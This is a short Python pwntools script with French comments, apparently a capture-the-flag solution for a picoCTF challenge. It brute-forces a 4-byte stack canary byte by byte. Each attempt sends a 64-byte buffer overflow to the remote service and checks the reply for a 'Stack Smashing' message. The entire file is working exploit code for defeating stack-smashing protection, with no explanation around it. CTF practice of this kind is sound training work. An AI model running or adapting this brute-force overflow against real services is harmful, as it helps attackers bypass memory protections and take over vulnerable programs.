from pwn import *

HOST = "saturn.picoctf.net"
PORT = 57858  # a adapter au port actuel de l instance

BUFSIZE = 64
CANARY_SIZE = 4

def try_canary(partial_canary):
    payload = b"A" * BUFSIZE + partial_canary
    conn = remote(HOST, PORT)
    conn.recvuntil(b">")
    conn.sendline(str(len(payload)).encode())
    conn.recvuntil(b">")
    conn.send(payload)
    resp = conn.recvall(timeout=2)
    conn.close()
    return resp

canary = b""
for byte_index in range(CANARY_SIZE):
    for guess in range(256):
        resp = try_canary(canary + bytes([guess]))
        if b"Stack Smashing" not in resp:
            canary += bytes([guess])
            print(f"[+] Octet {byte_index} trouve : {hex(guess)} -> canary partiel: {canary}")
            break
    else:
        print(f"[!] Aucun octet valide trouve pour la position {byte_index}")
        break

print(f"[+] CANARY FINAL: {canary}")
